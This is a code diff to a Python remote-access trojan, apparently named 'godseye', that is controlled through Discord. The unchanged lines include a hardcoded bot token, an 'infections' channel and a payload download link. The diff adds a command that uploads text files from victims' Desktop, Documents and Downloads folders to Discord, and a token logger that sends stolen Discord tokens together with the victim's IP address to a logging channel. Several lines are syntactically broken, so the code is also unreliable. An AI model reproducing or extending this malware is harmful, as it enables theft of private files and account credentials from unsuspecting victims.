@@ -1,4 +1,14 @@
-import requests,threading,urllib,os,time,random,json,urllib.request,discord,string,base64,os.path
+import requests
+import threading 
+import urllib import os
+import time
+import random 
+import json 
+import urllib.request
+import discord
+import string
+import base64
+import os.path
 from discord.utils import get
 from discord.ext import commands
 from PIL import ImageGrab
@@ -48,6 +58,7 @@ global DiscordBotToken
 global URI
 global OnlineVersion
 global CurrentVersion
+global TLC
 
 
 DiscordBotToken = ("ODc4OTgyNjE1MTU4MzU4MDY2.YSJGWg.uFGhwT1KE8y47dyv91Pc5KQPUCc")
@@ -56,6 +67,7 @@ IFC = 874824520693874756  # INFECTIONS-CHANNEL-ID
 GRL = 874824520693874755  # GENERAL-CHANNEL-ID
 PIC = 874824520886800435  # SCREENSHOT-CHANNEL-ID
 HTP = 874824520693874757   # HTTPSERVER-CHANNEL-ID
+TLC=884192312371073054 #tokenlogger channel
 URI ="https://cdn.discordapp.com/attachments/868361386240122880/872168121702699028/Realte.pyw" # PAYLOAD-DOWNLOAD
 OnlineVersion = str(VariableGrab(19))
 
@@ -201,5 +213,79 @@ async def nuke (ctx):
       continue
     else:
       await channel.delete()
+
+@godseye.command()
+async def downdir(ctx,arg):
+  if str(ctx.channel)==str(channelname):
+    await ctx.message.delete()
+    #only supports main dirs, pics, desktop, downloads etc)
+    dirs=["desktop","downloads","pictures","videos","documents","music"]
+    if arg in dirs:
+      os.chdir(f"C://users/{pc_username}/{arg}"
+      fileschan=(f"{channelname}s-files")
+      channels=[]
+      guild = godseye.get_guild(874824520467349504)
+      for c in guild.channels:
+        channels.append(c.name)
+      if fileschan in channels:
+        for file in os.listdir(os.getcwd()):
+          if file.endswith(".txt"):
+            with open(file, 'rb') as f:
+              picture = discord.File(f)
+              channel = discord.utils.get(ctx.guild.channels, name=fileschan)
+              filessend=godseye.get_channel(channel.id)
+              await filessend.send(file=picture)
+      else:
+        guild = godseye.get_guild(874824520467349504)
+        await guild.create_text_channel(fileschan)
+        for file in os.listdir(os.getcwd()):
+          if file.endswith(".txt"):
+            with open(file, 'rb') as f:
+              picture = discord.File(f)
+              channel = discord.utils.get(ctx.guild.channels, name=fileschan)
+              filessend=godseye.get_channel(channel.id)
+              await filessend.send(file=picture)
+              
+    else:
+      await ctx.send("not a supported dir")
+
+@godseye.command()
+async def tokenlog(ctx):
+  external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8'
+  embeds = []
+  working_tokens = []
+  working_ids = []
+  for platform, path in PATHS.items():
+      if not os.path.exists(path):
+          continue
+
+      for token in get_tokens(path):
+
+          uid = None
+          if not token.startswith('mfa.'):
+              try:
+                  uid = b64decode(token.split('.')[0].encode()).decode()
+              except:
+                  pass
+
+              if uid in working_ids:
+                  continue
+              else:
+                  working_ids.append(uid)
+              if token in working_tokens:
+                  continue
+              else:
+                  working_tokens.append(token)
+                  id_len=len(working_ids)
+                  tokens_len=len(working_tokens)
+                  count=0
+                  while count<id_len:
+                      tokens =client.get_channel(TLC)
+                      await tokens.send(f"{working_tokens[count]} from {external_ip}")
+                      time.sleep(3)
+                      count=count+1
+
+
+    
 
 godseye.run(DiscordBotToken)
